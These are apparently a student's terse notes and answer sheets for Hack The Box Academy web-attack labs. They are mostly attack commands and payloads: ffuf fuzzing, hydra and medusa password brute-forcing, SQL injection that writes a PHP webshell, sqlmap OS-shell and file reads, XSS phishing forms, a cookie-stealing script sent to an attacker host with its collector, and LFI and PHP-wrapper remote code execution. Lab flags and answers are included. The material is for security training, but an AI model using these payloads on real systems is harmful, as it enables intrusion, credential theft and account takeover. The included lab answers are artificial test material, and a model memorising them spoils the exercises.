ffuf -s -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u 'http://94.237.51.160/FUZZ'

ffuf -s -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u 'http://94.237.51.160:39918/blog/FUZZ.php'

"Try running a sub-domain fuzzing test on 'inlanefreight.com' to find a customer sub-domain portal. What is the full domain of it?"
ffuf -s -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u 'http://FUZZ.inlanefreight.com/'

ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb'

"Try running a VHost fuzzing scan on 'academy.htb', and see what other VHosts you get. What other VHosts did you get?"
sudo sh -c 'echo "STMIP academy.htb" >> /etc/hosts'
ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:31420/ -H 'Host: FUZZ.academy.htb'
ffuf -s -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:31420/ -H 'Host: FUZZ.academy.htb' -fs 986
ffuf -s -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:31145/ -H 'Host: FUZZ.academy.htb' -ac

Using what you learned in this section, run a parameter fuzzing scan on this page. What is the parameter accepted by this webpage?
sudo sh -c 'echo "STMIP admin.academy.htb" >> /etc/hosts'
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://admin.academy.htb:32354/admin/admin.php?FUZZ=key'
The response size of a request having an erroneous GET parameter is 798, thus, students need to filter it out using the -fs flag:
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://admin.academy.htb:32354/admin/admin.php?FUZZ=key' -fs 798

As we can see this time, we got a couple of hits, the same one we got when fuzzing GET and another parameter, which is id. Let's see what we get if we send a POST request with the id parameter. We can do that with curl, as follows:
curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'

"Try to create the 'ids.txt' wordlist, identify the accepted value with a fuzzing scan, and then use it in a 'POST' request with 'curl' to collect the flag. What is the content of the flag?"
sudo sh -c 'echo "139.59.180.127 admin.academy.htb" >> /etc/hosts'
for i in $(seq 1 1000); do echo $i >> ids.txt; done
ffuf -w ids.txt:FUZZ -u 'http://admin.academy.htb:31865/admin/admin.php' -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded'
The response size for any erroneous request is 768, therefore, students need to filter it out using the -fs flag:
ffuf -w ids.txt:FUZZ -u 'http://admin.academy.htb:31865/admin/admin.php' -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs 768
curl -s 'http://admin.academy.htb:31865/admin/admin.php' -X POST -d 'id=73' | grep 'HTB'

-----------------
import requests

ip = "83.136.249.34"  # Change this to your instance IP address
port = 38768       # Change this to your instance port number

# Download a list of common passwords from the web and split it into lines
passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt").text.splitlines()

# Try each password from the list
for password in passwords:
    print(f"Attempted password: {password}")

    # Send a POST request to the server with the password
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})

    # Check if the server responds with success and contains the 'flag'
    if response.ok and 'flag' in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break

-----------------------
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/darkweb2017_top-10000.txt
Next, we need to start matching that wordlist to the password policy.
grep -E '^.{8,}$' darkweb2017-top10000.txt > darkweb2017-minlength.txt


Brute-Forcing a Web Login Form
 hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"

hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
-----------------------------
Basic HTTP Authentication
------------------------------
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81

After successfully brute-forcing, and then logging into the target, what is the full flag you find?
-----------------------------
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f 94.237.52.235 -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"

After successfully brute-forcing, and then logging into the target, what is the full flag you find?
------------------------------
Medusa, a prominent tool in the cybersecurity arsenal, is designed to be a fast, massively parallel, and modular login brute-forcer. Its primary objective is to support a wide array of services that allow remote authentication, enabling penetration testers and security professionals to assess the resilience of login systems against brute-force attacks.
------------------------------
 What was the password for the ftpuser?
 sudo apt install medusa
 wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt
 medusa -h 83.136.255.143 -n 34377 -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
ssh sshuser@STMIP -p STMPO
nmap localhost
medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
ftp ftp://ftpuser:qqww1122@localhost
-------------------
 sudo apt install ruby -y
 git clone https://github.com/urbanadventurer/username-anarchy.git
 cd username-anarchy
 ./username-anarchy Jane Smith > jane_smith_usernames.txt
 -
 sudo apt install cupp -y
  cupp -i
   grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
   hydra -L usernames.txt -P jane-filtered.txt IP -s PORT -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
 After successfully brute-forcing, and then logging into the target, what is the full flag you find?
 -----------------------
 sudo apt install cupp -y
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
./username-anarchy Jane Smith > ../jane_smith_usernames.txt
cupp -i
grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
hydra -L jane_smith_usernames.txt -P jane-filtered.txt 94.237.53.113 -s 33384 -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
-======================================
"Connect to the database using the MySQL client from the command line. Use the 'show databases;' command to list databases in the DBMS. What is the name of the first database?"
mysql -h 46.101.61.42 -P 30658 -u root -ppassword
SHOW databases;
-------------
"What is the department number for the 'Development' department?"
mysql -h 46.101.61.42 -P 30658 -u root -ppassword
USE employees;
SHOW TABLES;
DESCRIBE departments;
SELECT dept_no FROM departments WHERE dept_name="Development";  SELECT * FROM departments;
---------------------
"What is the last name of the employee whose first name starts with "Bar" AND who was hired on 1990-01-01?"
USE employees; 
DESCRIBE employees;
SELECT last_name FROM employees WHERE first_name LIKE 'Bar%' AND hire_date='1990-01-01';
--------------------
"In the 'titles' table, what is the number of records WHERE the employee number is greater than 10000 OR their title does NOT contain 'engineer'?"
USE employees;
DESCRIBE titles;
SELECT COUNT(*) FROM titles WHERE emp_no > 10000 OR title NOT LIKE '%engineer%';
------------
1'; DROP TABLE
select * from logins where username like '%1'; DROP TABLE users;'
Error: near line 1: near "'": syntax error
select * from logins where username like '%1'; DROP TABLE users;'
----------------
"Try to log in as the user 'tom'. What is the flag value shown after you successfully log in?"
tom'; -- -
tom' OR '1' = '1' -- -
--------------------
SELECT username FROM logins; -- Selects usernames from the logins table 
Auth Bypass with comments
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
------------------------------------
' OR ID=5)-- -
-------------------------------
Connect to the above MySQL server with the 'mysql' tool, and find the number of records returned when doing a 'Union' of all records in the 'employees' table and all records in the 'departments' table.
mysql -h 46.101.61.42 -P 30658 -u root -ppassword
USE employees;
DESCRIBE employees;
DESCRIBE departments;
SELECT COUNT(*) FROM (SELECT * FROM employees UNION SELECT dept_no,dept_name,3,4,5,6 FROM departments) Foo;
SELECT * FROM employees UNION SELECT dept_no,dept_name,3,4,5,6 FROM departments;
-----------------------------
"Use a Union injection to get the result of 'user()'"
' UNION SELECT 1-- -
' UNION SELECT 1,2-- -
' UNION SELECT 1,2,3-- -
' UNION SELECT 1,2,3,4-- -
' UNION SELECT 1,user(),3,4-- -
-----------------------------
"What is the password hash for 'newuser' stored in the 'users' table in the 'ilfreight' database?"
foo' UNION SELECT 1,TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'-- -
foo' UNION SELECT 1,username,password,4 FROM ilfreight.users-- -
----------------------------
"We see in the above PHP code that '$conn' is not defined, so it must be imported using the PHP include command. Check the imported page to obtain the database password."
foo' UNION SELECT 1,user(),3,4-- -
foo' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
foo' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
foo' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
foo' UNION SELECT 1,LOAD_FILE("/var/www/html/config.php"),3,4-- -
---------------------------

"Find the flag by using a webshell."
foo' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
foo' UNION SELECT "",'<?php system($_REQUEST["cmd"]); ?>', "", "" INTO OUTFILE '/var/www/html/shell.php'-- -
http://STMIP:STMPO/shell.php?cmd=cat%20../flag.txt
-----------------------------
<SNIP>
$username = mysqli_real_escape_string($conn, $_POST['username']);
$password = mysqli_real_escape_string($conn, $_POST['password']);

$query = "SELECT * FROM logins WHERE username='". $username. "' AND password = '" . $password . "';" ;
echo "Executing query: " . $query . "<br /><br />";
<SNIP>
--------------------------
Input Validation
https://academy.hackthebox.com/module/33/section/794

============================
 sudo apt install sqlmap
  git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
--------------------
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
-------------------
sqlmap -u 'http://STMIP:STMPO/case2.php' --data 'id=1' --batch --dump
What's the contents of table flag3? (Case #3)"
sqlmap -u 'http://STMIP:STMPO/case3.php' -H 'Cookie: id=*' --batch --dump
"What's the contents of table flag4? (Case #4)"
sqlmap -r req.txt --batch --dump
---------------------
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch
-------------------
Prefix/Suffix
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
$result = mysqli_query($link, $query);
SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
-----------------
Level/Risk
sqlmap -u www.example.com/?id=1 -v 3 --level=5
sqlmap -u www.example.com/?id=1 -v 3
sqlmap -u www.example.com/?id=1
sqlmap -u www.example.com/?id=1 --level=5 --risk=3
-----------------
\"What's the contents of table flag5? (Case #5)"
Thus, the sqlmap command will be as follows (-T flag5 specifies the table to be dumped, instead of all the tables):
sqlmap -u 'http://83.136.253.5:57458/case5.php?id=1' --level 5 --risk 3 -T flag5 --batch --dump
"What's the contents of table flag6? (Case #6)"
sqlmap -u 'http://83.136.253.5:57458/case6.php?col=id' --prefix='`)' --batch --dump
"What's the contents of table flag7? (Case #7)"
sqlmap -u 'http://83.136.253.5:57458/case7.php?id=1' --technique=U --union-cols=5 --batch --dump
------------------
"What's the contents of table flag1 in the testdb database? (Case #1)"
sqlmap -u 'http://94.237.58.137:56113/case1.php?id=1' -D 'testdb' -T flag1 --batch --dump
---------------
 What's the name of the column containing "style" in it's name? (Case #1)
 sqlmap -u 'http://94.237.58.137:56113/case1.php?id=1' --search -C style --batch
 "What's the Kimberly user's password? (Case #1)"
 sqlmap -u 'http://94.237.58.137:56113/case1.php?id=1' --batch --dump
 -----------------
  What's the contents of table flag8? (Case #8)
  Students need to click on the "Submit" button, then open the Network Tab to view the request form data after selecting the POST request to "case8.php" that includes the anti-CSRF token name and value:
  sqlmap -u 'http://94.237.58.137:56113/case8.php?' --data 'id=1&t0ken=K3fnvaik6w4oVEnxABwPSjLJnwGIlGpZPYcAG9YQ' --csrf-token=t0ken --batch --dump

  "What's the contents of table flag9? (Case #9)"
  sqlmap -u "http://94.237.58.137:56113/case9.php?id=1&uid=3946810147" --randomize=uid --batch --dump

  "What's the contents of table flag10? (Case #10)"
  sqlmap -u 'http://94.237.58.137:56113/case10.php' --data="id=1" --random-agent --batch --dump
  "What's the contents of table flag11? (Case #11)"
   sqlmap -u 'http://94.237.58.137:56113/case11.php?id=1' --tamper=between -T flag11 --batch --dump
   -------------------------
    Try to use SQLMap to read the file "/var/www/html/flag.txt".
  sqlmap -u 'http://138.68.156.57:31020?id=1' --file-read "/var/www/html/flag.txt" --batch
  cat /home/htb-ac413848/.local/share/sqlmap/output/138.68.156.57/files/_var_www_html_flag.txt
  "Use SQLMap to get an interactive OS shell on the remote host and try to find another flag within the host."
  sqlmap -u 'http://138.68.156.57:31020?id=1' --os-shell --technique=E --batch
  cat /flag.txt

----------------------------
 <script>alert(document.cookie)</script>
  To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.
  <img src="" onerror=alert(document.cookie)>
-------------------------
 (like Nessus, Burp Pro, or ZAP)
 kinlingit@htb[/htb]$ git clone https://github.com/s0md3v/XSStrike.git
kinlingit@htb[/htb]$ cd XSStrike
kinlingit@htb[/htb]$ pip install -r requirements.txt
kinlingit@htb[/htb]$ python xsstrike.py
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md
https://github.com/payloadbox/xss-payload-list
-------------------
secure source
https://academy.hackthebox.com/course/preview/secure-coding-101-javascript
https://academy.hackthebox.com/course/preview/whitebox-pentesting-101-command-injection
-=-----------------
"Utilize some of the techniques mentioned in this section to identify the vulnerable input parameter found in the above server. What is the name of the vulnerable parameter?"
http://STMIP:STMPO/?fullname=test&username=test&password=123&email=test%40email.com:
<script>alert(1)</script>
"What type of XSS was found on the above server? "name only"
Reflected
------------------
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
<script>document.title = 'HackTheBox Academy'</script>
<script>document.body.style.background = "#141d2b"</script>
document.getElementById("todo").innerHTML = "New Text"
$("#todo").html('New Text');
document.getElementsByTagName('body')[0].innerHTML = "New Text"
---------------------
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
-------------------------
navigate to the /phishing directory, http://STMIP/phishing/:
'><script>alert(1)</script>

<h3>Please login to continue</h3>
<form action=http://PWNIP:PWNPO>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
document.write('<h3>Please login to continue</h3><form action=http://PWNIP:PWNPO><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
'><script>document.write('<h3>Please login to continue</h3><form action=http://PWNIP:PWNPO><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--

 PHP script provided in the module's section and save it as "index.php" under /tmp/tmpserver/
 <?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://STMIP/phishing/index.php");
    fclose($file);
    exit();
}
?>

php -S 0.0.0.0:8080

http://PWNIP/phishing/index.php?url=%27%3E%3Cscript%3Edocument.write%28%27%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2FPWNIP%3APWNPO%3E%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3Bdocument.getElementById%28%27urlform%27%29.remove%28%29%3B%3C%2Fscript%3E%3C%21--
------------
'Session Hijacking
/hijacking directory, http://PWNIP/hijacking/
nc -nvlp PWNPO
"><script src=http://PWNIP:PWNPO/script.js></script>
 /tmp/ directory script.js
 new Image().src='http://PWNIP:PWNPO/index.php?c='+document.cookie;
 index.php
 <?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>

php -S 0.0.0.0:8080

"><script src=http://PWNIP:PWNPO/script.js></script>

==============================
 Using the file inclusion find the name of a user on the system that starts with "b".
 ../../../etc/passwd 
 =/etc/passwd 
  curl -s "http://64.227.39.88:32225/index.php?language=../../../../etc/passwd" | grep ^b

"Submit the contents of the flag.txt file located in the /usr/share/flags directory."
curl -s "http://STMIP:STMPO/index.php?language=../../../../usr/share/flags/flag.txt" | grep "HTB"
----------------
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
non_existing_directory/../../../etc/passwd/./././<SNIP>././././
--------------------------
Try to bypass these filters to read /flag.txt
curl -s 'http://94.237.58.137:43521/index.php?language=languages/..././..././..././..././..././flag.txt' | grep 'HTB'
-------------------------
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d

"Fuzz the web application for other php scripts, and then read one of the configuration files and submit the database password as the answer"
ffuf -s -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://134.209.186.158:30757/FUZZ.php
http://STMIP:STMPO/index.php?language=php://filter/read=convert.base64-encode/resource=configure
HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}
echo -n 'PD9waHAKCmlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PSAnR0VUJyAmJiByZWFscGF0aChfX0ZJTEVfXykgPT0gcmVhbHBhdGgoJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddKSkgewogIGhlYWRlcignSFRUUC8xLjAgNDAzIEZvcmJpZGRlbicsIFRSVUUsIDQwMyk7CiAgZGllKGhlYWRlcignbG9jYXRpb246IC9pbmRleC5waHAnKSk7Cn0KCiRjb25maWcgPSBhcnJheSgKICAnREJfSE9TVCcgPT4gJ2RiLmlubGFuZWZyZWlnaHQubG9jYWwnLAogICdEQl9VU0VSTkFNRScgPT4gJ3Jvb3QnLAogICdEQl9QQVNTV09SRCcgPT4gJ0hUQntuM3Yzcl8kdDByM19wbDQhbnQzeHRfY3IzZCR9JywKICAnREJfREFUQUJBU0UnID0+ICdibG9nZGInCik7CgokQVBJX0tFWSA9ICJBd2V3MjQyR0RzaHJmNDYrMzUvayI7' | base64 -d
-------------------------
"Try to gain RCE using one of the PHP wrappers and read the flag at /"
A first approach is whereby students use the data wrapper to include a PHP web shell. But first, to determine whether the allow_url_include setting is enabled, students need to check the PHP configuration file of the Apache server using the convert.base64-encode filter:
curl -s 'http://46.101.81.30:30918/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini' | grep "W1BI" | sed 's/ \{12\}//g' | sed 's/<p class="read-more">//g' > configBase64.txt
cat configBase64.txt | base64 -d | grep 'allow_url_include'
Since this option is enabled, the data wrapper can be used. Students first need to base64-encode a basic PHP web shell:
echo '<?php system($_GET["cmd"]); ?>' | base64
Students now need to URL-encode the base64-encoded web shell, which can be achieved via Python3 (or by using cURL itself, as with the --data-urlencode flag, or with any online website such as urlencoder):
python3 -c 'import urllib.parse;print(urllib.parse.quote("PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg=="))'
 to pass it to the data wrapper with data://text/plain;base64,, passing commands as the value for the cmd URL-parameter.
 curl -s 'http://46.101.81.30:30980/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=ls+/' | grep -v "<.*>"
curl -s 'http://STMIP:STMPO/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=cat+/37809e2f8952f06139011994726d9ef1.txt' | grep -v "<.*>"
------
php blacklist exxtentionhttps://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt
--------------
content type wordlist
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
echo "GIF8" > text.jpg 
https://en.wikipedia.org/wiki/List_of_file_signatures
https://web.archive.org/web/20240522030920/https://opensource.apple.com/source/file/file-23/file/magic/magic.mime
-----------------
"The above server employs Client-Side, Blacklist, Whitelist, Content-Type, and MIME-Type filters to ensure the uploaded file is an image. Try to combine all of the attacks you learned so far to bypass these filters and upload a PHP file and read the flag at "/flag.txt"

exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
exiftool HTB.jpg
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
